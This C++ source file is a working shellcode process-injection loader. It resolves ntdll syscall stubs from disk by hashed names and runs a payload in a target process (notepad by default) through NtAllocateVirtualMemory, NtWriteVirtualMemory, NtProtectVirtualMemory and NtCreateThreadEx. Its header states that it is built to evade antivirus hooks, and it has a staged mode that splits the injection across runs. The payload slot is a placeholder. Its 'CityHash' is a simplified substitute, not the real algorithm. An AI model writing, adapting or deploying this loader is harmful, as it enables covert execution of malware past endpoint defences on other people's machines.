/**
Author: Thomas X Meng
Ninja syscall Process Injection code. Ninja syscall 1 dynamically resolves the native API function call’s RVA from ntdll on disk 
by its hash value. It uses CityHash, a lightweight cryptography method, to avoid hash collisions. 
Then it stores the API function's call stub in the heap. 
It then declares an API function prototype and initialises it to point to the syscall stub stored in the heap. 
Then it invokes the API function. The function name will neither appear in IAT/EAT nor within the code. 
AV would not detect the call from function hooked in ntdll. 
reference: NCC Group, 
https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/
No memory allocation or permission settings APIs.
**/

#include <windows.h>
#include <cstddef>
#include <cstdint>
#include <cstdio>
#include "winternl.h"
#pragma comment(lib, "ntdll")
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

void PrintProtectionValue(ULONG protectionValue) {
    switch (protectionValue) {
        case PAGE_NOACCESS:
            printf("PAGE_NOACCESS");
            break;
        case PAGE_READONLY:
            printf("PAGE_READONLY");
            break;
        case PAGE_READWRITE:
            printf("PAGE_READWRITE");
            break;
        case PAGE_WRITECOPY:
            printf("PAGE_WRITECOPY");
            break;
        case PAGE_EXECUTE:
            printf("PAGE_EXECUTE");
            break;
        case PAGE_EXECUTE_READ:
            printf("PAGE_EXECUTE_READ");
            break;
        case PAGE_EXECUTE_READWRITE:
            printf("PAGE_EXECUTE_READWRITE");
            break;
        case PAGE_EXECUTE_WRITECOPY:
            printf("PAGE_EXECUTE_WRITECOPY");
            break;
        case PAGE_GUARD:
            printf("PAGE_GUARD");
            break;
        case PAGE_NOCACHE:
            printf("PAGE_NOCACHE");
            break;
        case PAGE_WRITECOMBINE:
            printf("PAGE_WRITECOMBINE");
            break;
        default:
            printf("Unknown protection");
            break;
    }
}


// syscall stub preparation:
typedef DWORD(WINAPI *PFN_GETLASTERROR)();
typedef void (WINAPI *PFN_GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);
const int SYSCALL_STUB_SIZE = 23; // How arch depend are syscall stubs? 

// Define function pointers for the dynamic syscalls
using myNtOpenProcess = NTSTATUS(NTAPI*)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientID);
using myNtAllocateVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
using myNtCreateThreadEx = NTSTATUS(NTAPI*)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
using myNtWriteVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten);
using myNtClose = NTSTATUS(NTAPI*)(HANDLE Handle);

using myNtProtectVirtualMemory = NTSTATUS(NTAPI*)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect);


// API-hashing preparation: 
class CityHash {
public:
    uint64_t CityHash64(const char *buf, size_t len) {
        if (len <= 32) {
            if (len <= 16) {
                return HashLen0to16(buf, len);
            } else {
                return HashLen17to32(buf, len);
            }
        } else if (len <= 64) {
            return HashLen33to64(buf, len);
        }

        // For strings over 64 characters, CityHash uses a more complex algorithm
        // which is too lengthy to implement here. The official CityHash
        // implementation should be used for such cases.

        // Simplified version for longer strings:
        uint64_t hash = 0;
        for (size_t i = 0; i < len; ++i) {
            hash = hash * 33 + buf[i];
        }
        return hash;
    }

private:
    uint64_t HashLen0to16(const char* s, size_t len) {
        // Simplified hashing for short strings
        uint64_t a = 0, b = 0;
        for (size_t i = 0; i < len; ++i) {
            a = a * 31 + s[i];
            b = b * 33 + s[i];
        }
        return (a << 1) ^ b;
    }

    uint64_t HashLen17to32(const char* s, size_t len) {
        // Simplified hashing for medium strings
        uint64_t a = 0, b = 0;
        for (size_t i = 0; i < len; ++i) {
            a = a * 31 + s[i];
            b = b * 29 + s[i];
        }
        return (a << 2) ^ b;
    }

    uint64_t HashLen33to64(const char* s, size_t len) {
        // Simplified hashing for larger strings
        uint64_t a = 0, b = 0;
        for (size_t i = 0; i < len; ++i) {
            a = a * 37 + s[i];
            b = b * 39 + s[i];
        }
        return (a << 3) ^ b;
    }
};

CityHash cityHasher;

uint64_t getHashFromString(const char *string) {
    size_t stringLength = strnlen_s(string, 50);
    // Using CityHash to compute the hash
    return cityHasher.CityHash64(string, stringLength);
}

PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section)
{
	return (PVOID)(RVA - section->VirtualAddress + section->PointerToRawData);
}

PDWORD getFunctionAddressByHash(char *library, DWORD hash)
{
    PDWORD functionAddress = (PDWORD)0;

    // Get base address of the module in which our exported function of interest resides (user32 in the case of MessageBoxA)
    HMODULE libraryBase = LoadLibraryA(library); /// From here: 

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
    PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);

    DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

    PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);

    // Get RVAs to exported function related information
    PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);
    PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
    PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);

    for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++)
    {
        DWORD functionNameRVA = addressOfNamesRVA[i];
        DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
        char *functionName = (char *)functionNameVA;
        DWORD_PTR functionAddressRVA = 0;

        DWORD functionNameHash = getHashFromString(functionName);

        if (functionNameHash == hash)
        {
            functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
            functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA);
            printf("%s : 0x%x : %p\n", functionName, functionNameHash, functionAddress);
            return functionAddress;
        }
    }
    return functionAddress;
}

BOOL GetSyscallStubMem(DWORD functionHash, LPCSTR functionName, PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection, LPVOID syscallStub)
{
	PDWORD addressOfNames = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfNames), rdataSection);
	PDWORD addressOfFunctions = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfFunctions), rdataSection);
	BOOL stubFound = FALSE; 

	for (size_t i = 0; i < exportDirectory->NumberOfNames; i++)
	{
		DWORD_PTR functionNameVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfNames[i], rdataSection);
		DWORD_PTR functionVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfFunctions[i + 1], textSection);
		LPCSTR functionNameResolved = (LPCSTR)functionNameVA;
        char *functionNameResolvedResolved = (char *)functionNameResolved;
        DWORD functionNameHash = getHashFromString(functionNameResolvedResolved);

		// if (strcmp(functionNameHash, functionHash) == 0)
        if (functionNameHash == functionHash) // Corrected comparison
		{
            printf("[+] Address of %s in manual loaded ntdll export table: %p with hash: 0x%x\n", functionName, (void*)functionVA, functionNameHash);
            memcpy(syscallStub, (LPVOID)functionVA, SYSCALL_STUB_SIZE); //This
            // printf("[+] Address of %s in manual loaded ntdll export table: %p with hash: 0x%x\n", functionName, (void*)functionVA, functionNameHash);
			// memcpy(syscallStub, (LPVOID)functionVA, SYSCALL_STUB_SIZE); //This
			stubFound = TRUE;
			printf("[+] Syscall stub for %s found.\n", functionName);
            // Print the syscall stub bytes
            printf("[+] Syscall stub bytes: ");
            for (int i = 0; i < SYSCALL_STUB_SIZE; i++) {
                printf("%02X ", ((unsigned char*)syscallStub)[i]);
            }
            printf("\n");
			break;
		}
	}

	if (!stubFound) {
		printf("[-] Syscall stub for %s not found.\n", functionName);
	}
	return stubFound;
}

BOOL IsSystem64Bit() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) return FALSE;

    PFN_GETNATIVESYSTEMINFO pGetNativeSystemInfo = (PFN_GETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo");
    if (!pGetNativeSystemInfo) {
        FreeLibrary(hKernel32);
        return FALSE;
    }

    BOOL bIsWow64 = FALSE;
    SYSTEM_INFO si = {0};
    pGetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64) {
        bIsWow64 = TRUE;
    }

    FreeLibrary(hKernel32);
    return bIsWow64;
}

unsigned char magiccode[] = ####SHELLCODE####;

BOOL EnableWindowsPrivilege(const wchar_t* Privilege) {
    HANDLE token;
    TOKEN_PRIVILEGES priv;
    BOOL ret = FALSE;
    wprintf(L" [+] Enable %ls adequate privilege\n", Privilege);

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        priv.PrivilegeCount = 1;
        priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        // if (LookupPrivilegeValue(NULL, Privilege, &priv.Privileges[0].Luid) != FALSE &&
        if (LookupPrivilegeValueW(NULL, Privilege, &priv.Privileges[0].Luid) != FALSE &&
            AdjustTokenPrivileges(token, FALSE, &priv, 0, NULL, NULL) != FALSE) {
            ret = TRUE;
        }

        if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) { // In case privilege is not part of token (e.g. run as non-admin)
            ret = FALSE;
        }

        CloseHandle(token);
    }

    if (ret == TRUE)
        wprintf(L" [+] Success\n");
    else
        wprintf(L" [-] Failure\n");

    return ret;
}

int main(int argc, char *argv[]) {

    // Parameters for NtCreateFile: 
    HMODULE hNtdllDefault = GetModuleHandleA("ntdll.dll");
    if (hNtdllDefault == NULL) {
        printf("[-] Failed to get handle of the default loaded ntdll.dll.\n");
        return -1;
    } else {
        printf("[+] Memory address of the default loaded ntdll.dll: %p\n", hNtdllDefault);
    }

    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) {
        printf("[-] Failed to load kernel32.dll.\n");
        return -1;
    }

    // Load ntdll.dll and retrieve its handle
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to load ntdll.dll.\n");
        return -1;
    }

    PFN_GETLASTERROR pGetLastError = (PFN_GETLASTERROR)GetProcAddress(hKernel32, "GetLastError");

    if (!EnableWindowsPrivilege(L"SeDebugPrivilege")) {
    // if (!EnableWindowsPrivilege(TEXT("SeDebugPrivilege"))) {
        printf("[-]Failed to enable SeDebugPrivilege. You might not have sufficient permissions.\n");
        return -1;
    }

    // Target process information:
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    DWORD pid = 0;
    char notepadPath[256] = {0};  // Initialize the buffer

////////////////////////////////////////////////////////
    int step = -1; // Default value indicating 'step' is not set
    PVOID remoteBuffer = NULL; // Pointer to remoteBuffer
    BOOL pidProvided = FALSE, stepProvided = FALSE, bufferProvided = FALSE;
    // Parse command line arguments
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-pid") == 0 && i + 1 < argc) {
            pid = atoi(argv[++i]);
            pidProvided = TRUE;
        } else if (strcmp(argv[i], "-step") == 0 && i + 1 < argc) {
            step = atoi(argv[++i]);
            if (step < 1 || step > 3) {
                printf("Invalid step value: %d. Valid values are 1, 2, or 3. Default action will be taken.\n", step);
                step = -1; // Reset step to indicate invalid or not provided
            } else {
                stepProvided = TRUE;
            }
        } else if (strcmp(argv[i], "-buffer") == 0 && i + 1 < argc) {
            if (sscanf(argv[++i], "%p", &remoteBuffer) != 1) {
                printf("Invalid buffer address. Ensure it is a valid pointer value.\n");
                remoteBuffer = NULL; // Reset to NULL to indicate parsing failure
            } else {
                bufferProvided = TRUE;
            }
        }
    }

    // Validate command line arguments
    if (!pidProvided || !stepProvided || !bufferProvided) {
        // Default action or PID alone
        if (!pidProvided) {

            printf("Usage: %s -pid <PID> -step <1|2|3> -buffer <address>\n if no argument supplied, run in default mode\n", argv[0]);
            printf("Running with default notepad due to insufficient parameters.\n");

            // Determine the correct Notepad path based on system architecture
            if (IsSystem64Bit()) {
                strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\notepad.exe");
            } else {
                strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\SysWOW64\\notepad.exe");
            }

            // Attempt to create a process with Notepad
            BOOL success = CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
            if (!success) {
                MessageBox(NULL, "Failed to start Notepad.", "Error", MB_OK | MB_ICONERROR);
                return 1; // Exit if unable to start Notepad
            }
            printf("Notepad started with default settings.\n");
            pid = pi.dwProcessId;

        } else {
            printf("PID provided without -step and -buffer. Proceeding with PID: %lu\n", pid);
            pid = atoi(argv[1]);
        }
    } else {
        // All required parameters are provided
        printf("PID: %lu, Step: %d, Buffer Address: %p\n", pid, step, remoteBuffer);
        // Proceed with the logic using PID, step, and buffer
    }

    // Wait for 1 second
    Sleep(1000);
    printf("[*]target process PID: %d\n", pid);

	char syscallStub[SYSCALL_STUB_SIZE] = {}; //need once, instead of having multiple locations we can reuse this stub for every function.
	SIZE_T bytesWritten = 0;
	DWORD oldProtection = 0; //need once. 
	HANDLE file = NULL;
	DWORD fileSize = 0; // Changed from NULL
	DWORD bytesRead = 0; // Changed from NULL
	LPVOID fileData = NULL;


	// variables for NtCreateFile
	OBJECT_ATTRIBUTES oa;
	HANDLE fileHandle = NULL;
	NTSTATUS status = 0; 
	IO_STATUS_BLOCK osb;
	ZeroMemory(&osb, sizeof(IO_STATUS_BLOCK));
    
    ///// load the ntdll library
	
	file = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	fileSize = GetFileSize(file, NULL);
	fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
	ReadFile(file, fileData, fileSize, &bytesRead, NULL);
    // Print the memory location of loaded ntdll.dll
    printf("[+] Memory location of loaded ntdll.dll: %p\n", fileData);


	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileData + dosHeader->e_lfanew);
	DWORD exportDirRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(imageNTHeaders);
	PIMAGE_SECTION_HEADER textSection = section;
	PIMAGE_SECTION_HEADER rdataSection = section;
	
    bool rdataSectionFound = false;

    for (int i = 0; i < imageNTHeaders->FileHeader.NumberOfSections; i++) 
    {
        if (strcmp((CHAR*)section->Name, (CHAR*)".rdata") == 0) { 
            rdataSection = section;
            printf("[+] .rdata section found.\n");
            rdataSectionFound = true;
            break;
        }
        section++;
    }

    if (!rdataSectionFound) {
        printf("[-] .rdata section not found.\n");
    }


	PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)fileData + exportDirRVA, rdataSection);

   ///*********************************************************************************
    // open process:

    myNtOpenProcess NtOpenProcess = (myNtOpenProcess)(LPVOID)syscallStub;
    // VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // Open the target process
    HANDLE processHandle;
    CLIENT_ID clientId = { reinterpret_cast<HANDLE>(pid), nullptr };
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, nullptr, 0, nullptr, nullptr);

    DWORD hashCreateFile = getHashFromString("NtOpenProcess");
    // printf("hash of function NtOpenProcess: 0x%x\n", hashCreateFile);
	if (GetSyscallStubMem(hashCreateFile, "NtOpenProcess", exportDirectory, fileData, textSection, rdataSection, syscallStub)) {
        printf("[+] Memory location of NtOpenProcess syscall stub outwith EAT: %p\n", (void*)NtOpenProcess);

        VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection); 

        NTSTATUS status = NtOpenProcess(&processHandle, PROCESS_ALL_ACCESS, &objAttr, &clientId);
        if (status != STATUS_SUCCESS) {
            printf("[-] NtOpenProcess failed.\n");
            return -1;
        }
        printf("[+] NtOpenProcess succeeded.\n");
        // printf("[+] Process handle: %IX\n", (SIZE_T)processHandle);
    } else {
        printf("[-] Failed to execute NtOpenProcess.\n");
    }
    // // Change the protection of the syscall stub back to its original protection
    VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, oldProtection, &oldProtection);
    // printf("[+] Memory location of NtOpenProcess syscall stub: %p\n", (void*)NtOpenProcess);

    ///*********************************************************************************
    // virtual allocate:
    // arguments needed for NtAllocateVirtualMemory
    SIZE_T magiccodeSize = sizeof(magiccode);
    if (step == -1 || step == 1) {

        myNtAllocateVirtualMemory NtVirtualAlloc = (myNtAllocateVirtualMemory)(LPVOID)syscallStub;
        VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

        hashCreateFile = getHashFromString("NtAllocateVirtualMemory");
        // printf("hash of function NtAllocateVirtualMemory: 0x%x\n", hashCreateFile);
        if (GetSyscallStubMem(hashCreateFile, "NtAllocateVirtualMemory", exportDirectory, fileData, textSection, rdataSection, syscallStub)) {
            printf("[+] Memory location of NtAllocateVirtualMemory syscall stub outwith EAT: %p\n", (void*)NtVirtualAlloc);

            status = NtVirtualAlloc(processHandle, &remoteBuffer, 0, &magiccodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            // status = NtVirtualAlloc(processHandle, &remoteBuffer, 0, &magiccodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (status != STATUS_SUCCESS) {
                printf("[-] NtAllocateVirtualMemory failed.\n");
                return -1;
            }
            printf("[+] NtAllocateVirtualMemory succeeded.\n");
            printf("[+] Process handle: %IX\n", (SIZE_T)processHandle);
            if(step == 1) {
                printf("[*] ATTENTION: step 1, Ninja will strike the 1st blow! \n");
                printf("[******] ATTENTION: remoteBuffer: 0x%p\n", remoteBuffer);
                printf("[******] ATTENTION: pid to strike: %d\n", pid);
            }
        } else {
            printf("[-] Failed to execute NtAllocateVirtualMemory.\n");
        }

        // Change the protection of the syscall stub back to its original protection
        VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, oldProtection, &oldProtection);
        // printf("[*] old protection: %d\n", oldProtection);
    }

   ///*********************************************************************************

    // virtual memory write:
    if (step == -1 || step == 2) {
        myNtWriteVirtualMemory NtWriteMemory = (myNtWriteVirtualMemory)(LPVOID)syscallStub;
        VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

        // arguments needed for NtAllocateVirtualMemory
        ULONG bytesWrittens = 0;


        hashCreateFile = getHashFromString("NtWriteVirtualMemory");
        // printf("hash of function NtWriteVirtualMemory: 0x%x\n", hashCreateFile);
        if (GetSyscallStubMem(hashCreateFile, "NtWriteVirtualMemory", exportDirectory, fileData, textSection, rdataSection, syscallStub)) {
            printf("[+] Memory location of NtWriteVirtualMemory syscall stub outwith EAT: %p\n", (void*)NtWriteMemory);

            status = NtWriteMemory(processHandle, remoteBuffer, magiccode, magiccodeSize, &bytesWrittens);
            if (status != STATUS_SUCCESS) {
                printf("[-] NtWriteVirtualMemory failed.\n");
                return -1;
            }
            printf("[+] NtWriteVirtualMemory succeeded.\n");
            printf("[+] Process handle: %IX\n", (SIZE_T)processHandle);
            if(step == 2) {
                printf("[*] ATTENTION: step 2, Ninja will strike the 2nd blow! \n");
                printf("[******] ATTENTION:  remoteBuffer: 0x%p\n", remoteBuffer);
                printf("[******] ATTENTION: pid to strike: %d\n", pid);
            }   
        } else {
            printf("[-] Failed to execute NtWriteVirtualMemory.\n");
        }


        // Change the protection of the syscall stub back to its original protection
        VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, oldProtection, &oldProtection);
    }

    ///*********************************************************************************
    // Protect memory:
    if (step == -1 || step == 2) {
        DWORD hashProtectVirtualMemory = getHashFromString("NtProtectVirtualMemory");
        myNtProtectVirtualMemory NtProtectVirtualMemory = (myNtProtectVirtualMemory)(LPVOID)syscallStub;
        VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);


        ULONG oldProtectionValue = 0; 
        magiccodeSize = sizeof(magiccode);
        // printf("Attempting NtProtectVirtualMemory with:\n");
        // printf("Process Handle: %p\n", processHandle);
        // printf("Base Address: %p\n", remoteBuffer);
        // printf("Region Size: %zu\n", magiccodeSize);
        // printf("New Protection: %x\n", PAGE_EXECUTE_READ);

        if (GetSyscallStubMem(hashProtectVirtualMemory, "NtProtectVirtualMemory", exportDirectory, fileData, textSection, rdataSection, syscallStub)) {
            printf("[+] Memory location of NtProtectVirtualMemory syscall stub outwith EAT: %p\n", (void*)NtProtectVirtualMemory);

            status = NtProtectVirtualMemory(processHandle, &remoteBuffer, &magiccodeSize, PAGE_EXECUTE_READ, &oldProtectionValue);
            if (status != STATUS_SUCCESS) {
                printf("[-] NtProtectVirtualMemory failed with status code: 0x%lx.\n", status);
                return -1;
            }
            printf("[+] NtProtectVirtualMemory succeeded. Old protection was: ");
            PrintProtectionValue(oldProtectionValue);
            printf("\n");
        } else { 
            printf("[-] Failed to execute NtProtectVirtualMemory.\n");
        }
        VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, oldProtection, &oldProtection);
    }


   ///*********************************************************************************

    HANDLE threadHandle;

    if (step == -1 || step == 3) {
        if(step == 3) {
            printf("[*] ATTENTION: step 3, Ninja will strike the 3rd blow! \n");
        }   
        // create remote thread:
        myNtCreateThreadEx NtCreateThread = (myNtCreateThreadEx)(LPVOID)syscallStub;
        VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

        // arguments needed for NtAllocateVirtualMemory


        hashCreateFile = getHashFromString("NtCreateThreadEx");
        // printf("hash of function NtCreateThreadEx: 0x%x\n", hashCreateFile);
        if (GetSyscallStubMem(hashCreateFile, "NtCreateThreadEx", exportDirectory, fileData, textSection, rdataSection, syscallStub)) {
            printf("[+] Memory location of NtCreateThreadEx syscall stub outwith EAT: %p\n", (void*)NtCreateThread);
            status = NtCreateThread(&threadHandle, THREAD_ALL_ACCESS, nullptr, processHandle, reinterpret_cast<PVOID>(remoteBuffer), nullptr, FALSE, 0, 0, 0, nullptr);
            if (status != STATUS_SUCCESS) {
                printf("[-] NtCreateThreadEx failed.\n");
                return -1;
            }
            printf("[+] NtCreateThreadEx succeeded.\n");
            printf("[+] Process handle: %IX\n", (SIZE_T)processHandle);
        } else {
            printf("[-] Failed to execute NtCreateThreadEx.\n");
        }

        // Change the protection of the syscall stub back to its original protection
        VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, oldProtection, &oldProtection);
    }
    WaitForSingleObject(threadHandle, INFINITE);

    ///*********************************************************************************

    if (step == -1 || step == 3) {

        // close handle:
        myNtClose NtCloseHandle = (myNtClose)(LPVOID)syscallStub;
        VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

        hashCreateFile = getHashFromString("NtClose");
        // printf("hash of function NtClose: 0x%x\n", hashCreateFile);
        if (GetSyscallStubMem(hashCreateFile, "NtClose", exportDirectory, fileData, textSection, rdataSection, syscallStub)) {
            printf("[+] Memory location of NtClose syscall stub outwith EAT: %p\n", (void*)NtCloseHandle);
            status = NtCloseHandle(threadHandle);
            if (status != STATUS_SUCCESS) {
                printf("[-] NtCreateThreadEx failed.\n");
                return -1;
            }
            printf("[+] NtClose succeeded.\n");
            // Or, for a specific size and uppercase hexadecimal format:
            // printf("[+] thread handle: %IX\n", (SIZE_T)threadHandle);
        } else {
            printf("[-] Failed to execute NtClose.\n");
        }

        // Change the protection of the syscall stub back to its original protection
        VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, oldProtection, &oldProtection);
    }
    printf("[+] Successful! Ctrl+C to exit.\n");
    Sleep(155000);
    CloseHandle(processHandle);

	

    return 0;
}
